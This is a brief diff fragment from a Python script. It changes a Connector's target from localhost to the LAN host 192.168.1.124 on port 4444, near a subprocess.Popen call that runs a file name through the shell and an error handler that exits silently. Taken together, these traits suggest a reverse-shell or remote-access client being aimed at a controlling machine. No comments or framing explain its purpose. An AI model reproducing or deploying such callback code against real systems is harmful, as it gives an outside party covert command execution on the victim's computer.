@@ -80,7 +80,7 @@ subprocess.Popen(file_name, shell=True)
 
 
 try:
-    my_connector = Connector("127.0.0.1", 4444)
+    my_connector = Connector("192.168.1.124", 4444)
     my_connector.run()
 except Exception as e:
     sys.exit()
